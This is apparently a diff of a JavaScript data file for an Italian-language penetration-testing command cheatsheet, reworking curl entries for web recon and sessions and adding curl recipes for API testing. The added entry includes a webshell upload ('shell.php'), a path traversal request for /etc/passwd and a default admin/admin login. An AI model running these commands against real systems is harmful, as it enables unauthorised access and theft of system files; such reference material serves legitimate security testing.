     "platform": "cross-platform",
     "requires": [
       "hash"
@@ -19719,12 +20732,11 @@ const COMMANDS = [
   },
   {
     "id": "curl-recipes",
-    "name": "cURL — ricette utili",
+    "name": "curl — recon e sessioni",
     "category": "utilities",
     "subcategory": "cheatsheets",
-    "group": "HTTP",
-    "description": "Ricette `curl` per recon e testing: header del server, follow redirect, auth, login con cookie di sessione.",
-    "note": "# Cosa osservare\n-v mostra gli header di richiesta e risposta; -L segue i redirect; -b/-c gestiscono i cookie di sessione; -x instrada via proxy (Burp). Per le API: -H 'Content-Type: application/json' con -d. --path-as-is serve per il path traversal.",
+    "group": "cURL",
+    "description": "Ricette curl per il recon web e la gestione delle sessioni: leggere gli header del server, seguire i redirect, autenticarsi con token o tenere il cookie di sessione tra una richiesta e l’altra.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -19735,7 +20747,7 @@ const COMMANDS = [
     "tags": [
       "curl",
       "http",
-      "cheatsheet"
+      "web"
     ],
     "template": "curl -sI http://<ip>/",
     "params": [
@@ -19756,27 +20768,90 @@ const COMMANDS = [
         "id": "default",
         "label": "Header server",
         "template": "curl -sI http://<ip>/",
-        "description": "`-I` solo header (versione, tecnologie)."
+        "description": "Mostra i soli header di risposta: server, tecnologie, redirect e cookie, senza scaricare il corpo."
       },
       {
-        "id": "follow",
+        "id": "redirect",
         "label": "Segui redirect",
         "template": "curl -skL http://<ip>/",
-        "description": "`-L` segue i redirect, `-k` ignora TLS non valido."
+        "description": "Segue i redirect e ignora i certificati non validi, per arrivare alla pagina finale."
       },
       {
         "id": "bearer",
         "label": "Bearer token",
         "template": "curl -s http://<ip>/api -H \"Authorization: Bearer <token>\"",
-        "description": "Chiamata API autenticata."
+        "description": "Aggiunge un token di autorizzazione, il modo tipico di autenticarsi su un’API."
       },
       {
         "id": "cookie",
         "label": "Login + cookie",
         "template": "curl -s -c cookies.txt -d 'user=admin&pass=admin' http://<ip>/login; curl -s -b cookies.txt http://<ip>/dashboard",
-        "description": "`-c` salva il cookie di sessione, `-b` lo riusa."
+        "description": "Salva il cookie di sessione al login e lo riusa sulla richiesta successiva, per navigare da autenticato."
       }
-    ]
+    ],
+    "note": "# Flag ricorrenti\n`-s` silenzia la barra di avanzamento, `-k` ignora i certificati TLS non validi, `-v` mostra header di richiesta e risposta, `-L` segue i redirect e `-b` con `-c` gestiscono i cookie di sessione. Per inviare JSON, caricare file o passare da Burp vedi il comando curl API e testing."
+  },
+  {
+    "id": "curl-api",
+    "name": "curl — API e testing",
+    "category": "utilities",
+    "subcategory": "cheatsheets",
+    "group": "cURL",
+    "description": "Ricette curl per attaccare API ed endpoint: inviare JSON, caricare file, forzare il metodo HTTP, instradare tutto in Burp e sfruttare un path traversal dalla riga di comando.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "curl",
+      "api",
+      "web"
+    ],
+    "template": "curl -s http://<ip>/api -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"role\":\"admin\"}'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "POST JSON",
+        "template": "curl -s http://<ip>/api -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"role\":\"admin\"}'",
+        "description": "Invia un corpo JSON come vogliono quasi tutte le API. Senza l’header `Content-Type` molte scartano il body in silenzio."
+      },
+      {
+        "id": "upload",
+        "label": "Upload file",
+        "template": "curl -s -F 'file=@shell.php' http://<ip>/upload",
+        "description": "Carica un file simulando un form multipart, utile per piazzare una webshell su un endpoint di upload."
+      },
+      {
+        "id": "method",
+        "label": "Metodo HTTP",
+        "template": "curl -s -X PUT http://<ip>/api/item/1 -d '{\"x\":1}'",
+        "description": "Forza un metodo diverso come PUT o DELETE, per testare le API REST e il verb tampering."
+      },
+      {
+        "id": "burp",
+        "label": "Attraverso Burp",
+        "template": "curl -sk http://<ip>/ -x http://127.0.0.1:8080",
+        "description": "Instrada la richiesta nel proxy di Burp per ispezionarla e rigiocarla; `-k` ignora il certificato del proxy."
+      },
+      {
+        "id": "traversal",
+        "label": "Path traversal",
+        "template": "curl -s --path-as-is http://<ip>/../../../../etc/passwd",
+        "description": "`--path-as-is` impedisce a curl di normalizzare i `../`, indispensabile per sfruttare un path traversal dalla riga di comando."
+      }
+    ],
+    "note": "# Per le API e il testing\n`-H 'Content-Type: application/json'` con `-d` invia JSON, `-F` carica file in multipart, `-x http://127.0.0.1:8080` passa da Burp e `-X` forza il metodo. `--path-as-is` conserva i `../` senza semplificarli, indispensabile per il path traversal."
   }
 ];
 window.COMMANDS = COMMANDS;
